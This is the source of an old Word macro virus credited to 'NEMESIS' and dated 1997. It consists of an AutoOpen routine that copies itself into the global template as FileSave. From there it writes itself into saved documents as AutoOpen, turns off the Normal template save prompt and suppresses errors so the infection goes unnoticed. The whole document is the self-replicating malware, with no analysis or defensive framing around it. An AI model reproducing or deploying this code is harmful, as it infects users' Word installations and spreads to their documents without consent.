   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   '  BREEDER BY -=>NEMESIS<=-  5/4/97
   '  "DO NOT PROVOKE THE INTROVERT"

   Public Sub MAIN()
   Dim ThisFile$
   Dim dlg As Object
   Dim TheName$

   On Error GoTo -1: On Error GoTo TheEnd
   ThisFile$ = WordBasic.[MacroFileName$]()
   If UCase(WordBasic.[Right$](ThisFile$, 4)) = ".DOT" Then
       Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
       WordBasic.CurValues.FileSaveAs dlg
       TheName$ = WordBasic.[FileNameFromWindow$]()
       If TheName$ = "" Then
           WordBasic.Dialog.FileSaveAs dlg
           If dlg.Format = 0 Then dlg.Format = 1
       Else
           WordBasic.FileSaveAs Format:=1
       End If
           WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":AutoOpen"
           WordBasic.FileSaveAs dlg
   Else
       WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
       WordBasic.MacroCopy ThisFile$ + ":AutoOpen", "Global:FileSave"
   End If

   TheEnd:
   End Sub
